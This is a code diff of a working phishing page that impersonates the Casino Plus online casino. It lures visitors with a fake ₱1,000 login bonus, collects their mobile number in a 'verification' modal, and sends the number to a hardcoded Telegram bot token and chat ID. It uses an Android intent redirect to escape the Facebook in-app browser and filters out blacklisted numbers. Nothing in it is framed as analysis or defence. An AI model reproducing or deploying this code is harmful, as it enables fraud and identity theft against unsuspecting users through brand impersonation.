@@ -3,171 +3,229 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Casino Plus | Account Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+    <title>Casino Plus | Exclusive Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --casino-gold: #fbbf24;
-            --casino-dark: #0f172a;
-            --bg-dark: #0a0a0b;
+            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
+            --dark-bg: #04070d;
+            --accent-blue: #1e3a8a;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background-color: var(--bg-dark);
-            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #0a0a0b 100%);
-            color: #ffffff;
             font-family: 'Public Sans', sans-serif;
+            background-color: var(--dark-bg);
+            background-image: radial-gradient(circle at 50% 0%, var(--accent-blue) 0%, transparent 50%);
+            color: #ffffff;
             display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Main Landing Card */
+        .main-card {
+            width: 92%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            border-radius: 30px;
+            padding: 30px 20px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        .logo-img { width: 170px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.4)); }
+        
+        h1 { font-size: 24px; font-weight: 800; margin-bottom: 10px; color: #fff; }
+        .promo-text { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
+
+        /* Pop-up Modal Overlay */
+        .modal-overlay {
+            display: none; /* Hidden by default */
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(15px);
+            z-index: 99999;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            padding: 15px;
         }
 
-        .card {
-            width: 92%;
+        .modal-content {
+            width: 100%;
             max-width: 380px;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 24px;
-            padding: 30px 20px;
-            backdrop-filter: blur(20px);
+            background: #0f172a;
+            border: 1px solid rgba(212, 175, 55, 0.5);
+            border-radius: 25px;
+            padding: 35px 20px;
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            animation: modalPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        .logo-img { width: 160px; margin-bottom: 20px; }
+        @keyframes modalPop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; }
-        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        /* Input Design */
+        .input-box {
+            text-align: left;
+            margin-top: 20px;
+        }
 
-        /* Input Group */
-        .input-group { text-align: left; margin-bottom: 20px; }
-        .label-text { display: block; font-size: 11px; text-transform: uppercase; color: var(--casino-gold); font-weight: 700; margin-bottom: 8px; margin-left: 5px; }
+        .input-box label {
+            font-size: 11px;
+            color: #fbbf24;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-left: 5px;
+        }
 
         input {
             width: 100%;
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            padding: 16px;
-            color: white;
-            font-size: 20px;
-            text-align: center;
-            font-family: 'JetBrains Mono', monospace;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--casino-gold); }
-
-        .btn-primary {
-            background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 100%);
-            color: #0f172a;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(251, 191, 36, 0.2);
-        }
-
-        .btn-primary:active { transform: scale(0.97); }
-
-        /* Ang ni-request mong Image */
-        .promo-img {
-            width: 100%;
-            border-radius: 12px;
-            margin-top: 20px;
+            background: #000;
             border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 18px;
+            color: #fff;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-top: 8px;
+            outline: none;
+            font-family: 'Orbitron', sans-serif;
         }
 
-        #status-msg { color: #ff3b30; font-size: 12px; margin-top: 15px; display: none; font-weight: 600; }
+        input:focus { border-color: #d4af37; box-shadow: 0 0 15px rgba(212,175,55,0.2); }
 
-        .spinner {
-            width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1);
-            border-top: 2px solid #000; border-radius: 50%;
-            animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;
+        /* Buttons */
+        .btn-gold {
+            background: var(--gold);
+            color: #000;
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 8px 0 #8b6508;
+            margin-top: 20px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .btn-gold:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
+
+        .promo-img { width: 100%; border-radius: 15px; margin-top: 20px; border: 1px solid rgba(255,255,255,0.1); }
+
+        #error-msg { color: #ff4d4d; font-size: 13px; font-weight: 700; margin-top: 15px; display: none; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://casinoplus.static2.website/images/logo1.png" class="logo-img" alt="CasinoPlus">
-        <h1>Identity Verification</h1>
-        <p>Your account is flagged for a pending reward claim. Please verify your mobile number to continue.</p>
+    <div class="main-card">
+        <img src="https://casinoplus.static2.website/images/logo1.png" class="logo-img">
+        <h1>Exclusive Reward</h1>
+        <p class="promo-text">You are eligible to receive a <b>₱1,000.00</b> login bonus. Tap the button below to claim your reward.</p>
         
-        <div class="input-group">
-            <span class="label-text">Registered Mobile Number</span>
-            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <button class="btn-gold" onclick="triggerIntent()">Claim Reward Now</button>
+        
+        <img src="free_depo.jpeg" class="promo-img">
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            <h2 style="font-size: 20px; margin-bottom: 10px;">Account Verification</h2>
+            <p style="font-size: 13px; color: #94a3b8;">Enter your registered mobile number to verify your identity and sync your bonus.</p>
+            
+            <div class="input-box">
+                <label>Mobile Number</label>
+                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+
+            <button class="btn-gold" id="finalBtn" onclick="submitData()">Verify & Continue</button>
+            <div id="error-msg"></div>
         </div>
-
-        <button class="btn-primary" id="claimBtn" onclick="processClaim()">Verify and Claim</button>
-        
-        <div id="status-msg"></div>
-
-        <img src="free_depo.jpeg" class="promo-img" alt="Promotion">
     </div>
 
     <script src="config.js"></script>
+
     <script>
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
-        const BYPASS_MODE = true;
 
-        // Intent logic para sa FB Browser
-        window.onload = () => {
+        // 1. Intent & Modal Logic
+        function triggerIntent() {
             const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            
             if (!window.location.hash.includes("verified")) {
+                // Force open in Chrome (FB Bypass)
                 window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
+                
+                // Fallback show modal if redirect fails
+                setTimeout(() => showModal(), 1000);
+            } else {
+                showModal();
+            }
+        }
+
+        function showModal() {
+            document.getElementById('modalOverlay').style.display = 'flex';
+            document.getElementById('userPhone').focus();
+        }
+
+        // Auto-show modal kung may hash na (galing sa Intent)
+        window.onload = () => {
+            if (window.location.hash.includes("verified")) {
+                showModal();
             }
         };
 
-        async function processClaim() {
+        // 2. Data Submission & Blacklist Filter
+        async function submitData() {
             const phone = document.getElementById('userPhone').value.trim();
-            const btn = document.getElementById('claimBtn');
-            const status = document.getElementById('status-msg');
+            const btn = document.getElementById('finalBtn');
+            const error = document.getElementById('error-msg');
 
-            // Validation
+            // Phone Validation
             if (phone.length < 11 || !phone.startsWith('09')) {
-                status.innerHTML = "⚠️ Please enter a valid 11-digit number.";
-                status.style.display = "block";
+                displayError("⚠️ Please enter a valid 11-digit mobile number.");
                 return;
             }
 
             btn.disabled = true;
-            btn.innerHTML = `<div class="spinner"></div> VERIFYING...`;
-            status.style.display = "none";
+            btn.innerHTML = "VERIFYING...";
+            error.style.display = "none";
 
-            // Blacklist Check (Galing sa config.js)
+            // --- BLACKLIST FILTER (Connected to config.js) ---
             if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
                 setTimeout(() => {
-                    status.innerHTML = "❌ Access Denied: Account not eligible.";
-                    status.style.display = "block";
+                    displayError("❌ Access Denied: This number is not eligible for this promo.");
                     btn.disabled = false;
-                    btn.innerHTML = "Verify and Claim";
+                    btn.innerHTML = "Verify & Continue";
                 }, 1500);
-                return;
+                return; // STOP
             }
 
-            // Telegram Send
+            // Telegram Notification
             const msg = `🎰 CASINO PLUS LOGIN\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
 
-            // Bypass Redirect
-            if (BYPASS_MODE) {
-                setTimeout(() => {
-                    window.location.href = "main.html";
-                }, 1800);
-            }
+            // Success Redirect
+            setTimeout(() => {
+                window.location.href = "main.html";
+            }, 1800);
+        }
+
+        function displayError(msg) {
+            const el = document.getElementById('error-msg');
+            el.innerHTML = msg;
+            el.style.display = "block";
         }
     </script>
 </body>
